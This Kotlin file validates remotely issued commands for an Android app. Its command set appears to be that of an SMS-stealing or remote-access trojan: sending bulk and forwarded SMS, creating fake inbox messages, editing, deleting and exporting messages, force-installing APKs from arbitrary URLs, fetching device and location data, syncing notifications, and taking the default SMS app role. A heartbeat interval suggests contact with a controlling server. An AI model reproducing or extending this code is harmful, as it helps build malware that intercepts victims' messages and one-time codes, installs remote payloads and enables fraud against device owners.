package com.example.fast.service

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import androidx.core.app.ActivityCompat
import com.example.fast.util.LogHelper
import com.example.fast.util.NetworkUtils
import com.example.fast.util.VersionChecker
import com.example.fast.util.RateLimitResult
import com.example.fast.util.PermissionCheckResult
import com.example.fast.util.ValidationResult
import com.example.fast.util.ResourceCheckResult

/**
 * CommandValidationHelpers - Helper functions for comprehensive command validation
 * 
 * Provides validation functions for:
 * - Rate limiting checks
 * - Permission verification
 * - Content validation and parsing
 * - Resource availability checks
 */
object CommandValidationHelpers {
    
    /**
     * Check rate limiting for a command
     */
    fun checkRateLimitingForCommand(
        commandKey: String,
        commandCooldownsMs: Map<String, Long>,
        isCommandRateLimited: (String, Long) -> Boolean,
        recordCommandExecution: (String) -> Unit
    ): RateLimitResult {
        return try {
            commandCooldownsMs[commandKey]?.let { intervalMs ->
                if (isCommandRateLimited(commandKey, intervalMs)) {
                    RateLimitResult(
                        allowed = false,
                        reason = "Rate limited for command: $commandKey",
                        nextAllowedAt = System.currentTimeMillis() + intervalMs
                    )
                } else {
                    recordCommandExecution(commandKey)
                    RateLimitResult(allowed = true, reason = null, nextAllowedAt = null)
                }
            } ?: RateLimitResult(allowed = true, reason = null, nextAllowedAt = null)
        } catch (e: Exception) {
            LogHelper.e("CommandValidation", "Error checking rate limiting for $commandKey", e)
            RateLimitResult(allowed = false, reason = "Rate limit check failed: ${e.message}", nextAllowedAt = null)
        }
    }
    
    /**
     * Check permissions required for a command
     */
    fun checkCommandPermissionsForCommand(
        commandKey: String,
        context: Context
    ): PermissionCheckResult {
        return try {
            val requiredPermissions = getRequiredPermissionsForCommand(commandKey)
            val granted = mutableListOf<String>()
            val denied = mutableListOf<String>()
            val missing = mutableListOf<String>()
            
            for (permission in requiredPermissions) {
                when {
                    ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED -> {
                        granted.add(permission)
                    }
                    permission in getDangerousPermissions() -> {
                        denied.add(permission)
                        missing.add(permission)
                    }
                    else -> {
                        missing.add(permission)
                    }
                }
            }
            
            PermissionCheckResult(
                checked = true,
                granted = granted,
                denied = denied,
                missing = missing
            )
        } catch (e: Exception) {
            LogHelper.e("CommandValidation", "Error checking permissions for $commandKey", e)
            PermissionCheckResult(false, emptyList(), emptyList(), listOf("Permission check failed"))
        }
    }
    
    /**
     * Validate and parse command content
     */
    fun validateCommandContentForCommand(
        commandKey: String,
        content: String
    ): ValidationResult {
        return try {
            when (commandKey) {
                "sendSms" -> validateSendSmsContent(content)
                "updateApk" -> validateUpdateApkContent(content)
                "installApk" -> validateInstallApkContent(content)
                "showNotification" -> validateShowNotificationContent(content)
                "requestPermission" -> validateRequestPermissionContent(content)
                "showCard" -> validateShowCardContent(content)
                "controlAnimation" -> validateControlAnimationContent(content)
                "setHeartbeatInterval" -> validateSetHeartbeatIntervalContent(content)
                "sendSmsDelayed" -> validateSendSmsDelayedContent(content)
                "scheduleSms" -> validateScheduleSmsContent(content)
                "editMessage" -> validateEditMessageContent(content)
                "deleteMessage" -> validateDeleteMessageContent(content)
                "createFakeMessage" -> validateCreateFakeMessageContent(content)
                "setupAutoReply" -> validateSetupAutoReplyContent(content)
                "startAnimation" -> validateStartAnimationContent(content)
                "forwardMessage" -> validateForwardMessageContent(content)
                "sendBulkSms" -> validateSendBulkSmsContent(content)
                "sendSmsTemplate" -> validateSendSmsTemplateContent(content)
                "saveTemplate" -> validateSaveTemplateContent(content)
                "deleteTemplate" -> validateDeleteTemplateContent(content)
                "backupMessages" -> validateBackupMessagesContent(content)
                "exportMessages" -> validateExportMessagesContent(content)
                "executeWorkflow" -> validateExecuteWorkflowContent(content)
                else -> ValidationResult(true, emptyList(), content, emptyMap())
            }
        } catch (e: Exception) {
            LogHelper.e("CommandValidation", "Error validating content for $commandKey", e)
            ValidationResult(false, listOf("Content validation failed: ${e.message}"), null, emptyMap())
        }
    }
    
    /**
     * Check system resources for command execution
     */
    fun checkCommandResourcesForCommand(
        commandKey: String,
        context: Context
    ): ResourceCheckResult {
        return try {
            val networkAvailable = NetworkUtils.isNetworkConnected(context)
            val storageAvailable = hasSufficientStorage(context)
            val batterySufficient = hasSufficientBattery(context)
            val systemReady = isSystemReady(context)
            
            ResourceCheckResult(
                networkAvailable = networkAvailable,
                storageAvailable = storageAvailable,
                batterySufficient = batterySufficient,
                systemReady = systemReady
            )
        } catch (e: Exception) {
            LogHelper.e("CommandValidation", "Error checking resources for $commandKey", e)
            ResourceCheckResult(false, false, false, false)
        }
    }
    
    // Private helper functions
    
    private fun getRequiredPermissionsForCommand(commandKey: String): List<String> {
        return when (commandKey) {
            "sendSms", "sendSmsDelayed", "scheduleSms", "forwardMessage", "sendBulkSms", "sendSmsTemplate" -> listOf(
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS
            )
            "fetchSms", "editMessage", "deleteMessage", "backupMessages", "exportMessages" -> listOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CONTACTS
            )
            "requestPermission", "checkPermission", "removePermission" -> emptyList()
            "updateApk", "installApk" -> listOf(
                Manifest.permission.REQUEST_INSTALL_PACKAGES,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
            "fetchDeviceInfo" -> listOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS
            )
            "showNotification" -> listOf(Manifest.permission.POST_NOTIFICATIONS)
            "syncNotification" -> listOf(
                Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
                Manifest.permission.POST_NOTIFICATIONS
            )
            "requestDefaultSmsApp", "requestDefaultMessageApp" -> listOf(
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_WAP_PUSH,
                Manifest.permission.RECEIVE_MMS
            )
            else -> emptyList()
        }
    }
    
    private fun getDangerousPermissions(): List<String> {
        return listOf(
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.RECEIVE_WAP_PUSH,
            Manifest.permission.RECEIVE_MMS
        )
    }
    
    private fun validateSendSmsContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Content cannot be blank")
            return ValidationResult(false, errors, null, emptyMap())
        }
        
        // Parse command content - support both formats
        val simIndex = content.indexOf(";")
        val colonIndex = content.indexOf(":")
        
        if (colonIndex == -1) {
            errors.add("Invalid format: missing ':' separator. Expected: phone:message or sim;phone:message")
        } else {
            val phone: String
            val sms: String
            val sim: Int
            
            if (simIndex != -1 && simIndex < colonIndex) {
                // Format 2: sim;phone:message
                val simStr = content.substring(0, simIndex).trim()
                sim = simStr.toIntOrNull() ?: 1
                phone = content.substring(simIndex + 1, colonIndex).trim()
                sms = content.substring(colonIndex + 1).trim()
            } else {
                // Format 1: phone:message (default to SIM 1)
                sim = 1
                phone = content.substring(0, colonIndex).trim()
                sms = content.substring(colonIndex + 1).trim()
            }
            
            if (phone.isBlank()) errors.add("Phone number cannot be blank")
            if (sms.isBlank()) errors.add("Message cannot be blank")
            if (sim != 1 && sim != 2) errors.add("SIM number must be 1 or 2")
            
            params["phone"] = phone
            params["message"] = sms
            params["sim"] = sim
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateUpdateApkContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val trimmed = content.trim()
        if (trimmed.isBlank()) {
            errors.add("Download URL cannot be blank")
            return ValidationResult(false, errors, null, emptyMap())
        }
        
        val force = trimmed.lowercase().startsWith("force|")
        val remainder = if (force) trimmed.substring(5).trim() else trimmed
        
        // Parse remainder as url or versionCode|url
        val pipeIdx = remainder.indexOf('|')
        val (versionCode, url) = if (pipeIdx > 0) {
            val code = remainder.substring(0, pipeIdx).trim().toIntOrNull() ?: 0
            val u = remainder.substring(pipeIdx + 1).trim()
            code to u
        } else {
            0 to remainder
        }
        
        if (url.isBlank()) {
            errors.add("URL cannot be blank")
        } else if (!isValidUrl(url)) {
            errors.add("Invalid URL format")
        }
        
        params["url"] = url
        params["versionCode"] = versionCode
        params["force"] = force
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateInstallApkContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val trimmed = content.trim()
        if (trimmed.isBlank()) {
            errors.add("Content cannot be blank")
            return ValidationResult(false, errors, null, emptyMap())
        }
        
        val pipeIdx = trimmed.indexOf('|')
        val (title, url) = if (pipeIdx > 0) {
            trimmed.substring(0, pipeIdx).trim() to trimmed.substring(pipeIdx + 1).trim()
        } else {
            null to trimmed
        }
        
        if (url.isBlank()) {
            errors.add("URL cannot be blank")
        } else if (!isValidUrl(url)) {
            errors.add("Invalid URL format")
        }
        
        params["url"] = url
        if (title != null) params["title"] = title
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateShowNotificationContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Content cannot be blank")
            return ValidationResult(false, errors, null, emptyMap())
        }
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected at least 3 parts separated by '|'")
        } else {
            params["title"] = parts.getOrNull(1) ?: ""
            params["message"] = parts.getOrNull(2) ?: ""
            params["channel"] = parts.getOrNull(3) ?: "default"
            params["priority"] = parts.getOrNull(4) ?: "default"
            params["action"] = parts.getOrNull(5) ?: ""
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateRequestPermissionContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Permissions cannot be blank")
        } else {
            val permissions = content.split(",").map { it.trim() }.filter { it.isNotEmpty() }
            if (permissions.isEmpty()) {
                errors.add("No valid permissions found")
            } else {
                params["permissions"] = permissions
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateShowCardContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val cardType = content.trim().lowercase()
        if (cardType !in listOf("sms", "instruction", "message", "webview", "permission", "update")) {
            errors.add("Invalid card type: $cardType. Expected: sms, instruction, message, webview, permission, or update")
        }
        
        params["cardType"] = cardType
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateControlAnimationContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val trimmedContent = content.trim().lowercase()
        if (trimmedContent !in listOf("start", "off sms", "off instruction", "off")) {
            errors.add("Invalid animation control: $trimmedContent")
        }
        
        params["control"] = trimmedContent
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSetHeartbeatIntervalContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val interval = content.trim().toLongOrNull()
        if (interval == null || interval < 1000) {
            errors.add("Invalid heartbeat interval: $content. Must be a number >= 1000ms")
        } else {
            params["interval"] = interval
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSendSmsDelayedContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'delay|phone:message'")
        } else {
            val delay = parts[0].trim().toLongOrNull()
            if (delay == null || delay < 0) {
                errors.add("Invalid delay: ${parts[0]}")
            } else {
                params["delay"] = delay
                val smsContent = parts.subList(1, parts.size).joinToString("|")
                val smsValidation = validateSendSmsContent(smsContent)
                if (!smsValidation.valid) {
                    errors.addAll(smsValidation.errors)
                } else {
                    params.putAll(smsValidation.extractedParams)
                }
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateScheduleSmsContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 4) {
            errors.add("Invalid format: expected 'timestamp|phone:message'")
        } else {
            val timestamp = parts[0].trim().toLongOrNull()
            if (timestamp == null || timestamp < System.currentTimeMillis()) {
                errors.add("Invalid timestamp: ${parts[0]}")
            } else {
                params["timestamp"] = timestamp
                val smsContent = parts.subList(1, parts.size).joinToString("|")
                val smsValidation = validateSendSmsContent(smsContent)
                if (!smsValidation.valid) {
                    errors.addAll(smsValidation.errors)
                } else {
                    params.putAll(smsValidation.extractedParams)
                }
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateEditMessageContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'messageId|newContent'")
        } else {
            params["messageId"] = parts[0].trim()
            params["newContent"] = parts.subList(1, parts.size).joinToString("|")
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateDeleteMessageContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Message ID cannot be blank")
        } else {
            params["messageId"] = content.trim()
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateCreateFakeMessageContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 4) {
            errors.add("Invalid format: expected 'phone|message|timestamp'")
        } else {
            params["phone"] = parts[0].trim()
            params["message"] = parts[1].trim()
            val timestamp = parts[2].trim().toLongOrNull()
            if (timestamp == null) {
                errors.add("Invalid timestamp: ${parts[2]}")
            } else {
                params["timestamp"] = timestamp
            }
            params["type"] = parts.getOrNull(3) ?: "inbox"
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSetupAutoReplyContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'keyword|reply|enabled'")
        } else {
            params["keyword"] = parts[0].trim()
            params["reply"] = parts[1].trim()
            val enabled = parts[2].trim().lowercase()
            if (enabled !in listOf("true", "false", "1", "0")) {
                errors.add("Invalid enabled flag: $enabled")
            } else {
                params["enabled"] = enabled in listOf("true", "1")
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateStartAnimationContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val animationType = content.trim().lowercase()
        if (animationType !in listOf("sms", "instruction", "flip")) {
            errors.add("Invalid animation type: $animationType")
        }
        
        params["type"] = animationType
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateForwardMessageContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'messageId|targetPhone'")
        } else {
            params["messageId"] = parts[0].trim()
            params["targetPhone"] = parts[1].trim()
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSendBulkSmsContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'message|phone1,phone2,...'")
        } else {
            params["message"] = parts[0].trim()
            val phones = parts[1].trim().split(",").map { it.trim() }.filter { it.isNotEmpty() }
            if (phones.isEmpty()) {
                errors.add("No valid phone numbers found")
            } else {
                params["phones"] = phones
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSendSmsTemplateContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'templateId|phone'")
        } else {
            params["templateId"] = parts[0].trim()
            params["phone"] = parts[1].trim()
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateSaveTemplateContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 3) {
            errors.add("Invalid format: expected 'templateName|message'")
        } else {
            params["templateName"] = parts[0].trim()
            params["message"] = parts.subList(1, parts.size).joinToString("|")
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateDeleteTemplateContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Template name cannot be blank")
        } else {
            params["templateName"] = content.trim()
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateBackupMessagesContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val backupType = content.trim().lowercase()
        if (backupType !in listOf("all", "sent", "received", "custom")) {
            errors.add("Invalid backup type: $backupType")
        }
        
        params["backupType"] = backupType
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateExportMessagesContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        val parts = content.split("|")
        if (parts.size < 2) {
            errors.add("Invalid format: expected 'format|filter'")
        } else {
            val format = parts[0].trim().lowercase()
            if (format !in listOf("csv", "json", "txt", "xml")) {
                errors.add("Invalid export format: $format")
            } else {
                params["format"] = format
                params["filter"] = parts.getOrNull(1) ?: "all"
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun validateExecuteWorkflowContent(content: String): ValidationResult {
        val errors = mutableListOf<String>()
        val params = mutableMapOf<String, Any>()
        
        if (content.isBlank()) {
            errors.add("Workflow JSON cannot be blank")
        } else {
            // Basic JSON validation
            try {
                // Could use Gson for proper validation, but basic check for now
                if (!content.trim().startsWith("{") || !content.trim().endsWith("}")) {
                    errors.add("Invalid JSON format")
                }
                params["workflowJson"] = content
            } catch (e: Exception) {
                errors.add("Invalid JSON: ${e.message}")
            }
        }
        
        return ValidationResult(errors.isEmpty(), errors, content, params)
    }
    
    private fun isValidUrl(url: String): Boolean {
        return try {
            android.net.Uri.parse(url).scheme?.let { it in listOf("http", "https") } ?: false
        } catch (e: Exception) {
            false
        }
    }
    
    private fun hasSufficientStorage(context: Context): Boolean {
        return try {
            val storageManager = context.getSystemService(Context.STORAGE_SERVICE) as? android.os.storage.StorageManager
            val availableBytes = storageManager?.getAllocatableBytes(java.util.UUID.randomUUID()) ?: 0L
            availableBytes > 50 * 1024 * 1024 // At least 50MB available
        } catch (e: Exception) {
            LogHelper.w("CommandValidation", "Could not check storage availability", e)
            true // Assume sufficient if check fails
        }
    }
    
    private fun hasSufficientBattery(context: Context): Boolean {
        return try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
            batteryLevel > 15 // At least 15% battery
        } catch (e: Exception) {
            LogHelper.w("CommandValidation", "Could not check battery level", e)
            true // Assume sufficient if check fails
        }
    }
    
    private fun isSystemReady(context: Context): Boolean {
        return try {
            // Check if system is ready for operations
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val isInteractive = powerManager?.isInteractive ?: true
            
            // Additional checks can be added here
            isInteractive
        } catch (e: Exception) {
            LogHelper.w("CommandValidation", "Could not check system readiness", e)
            true // Assume ready if check fails
        }
    }
}
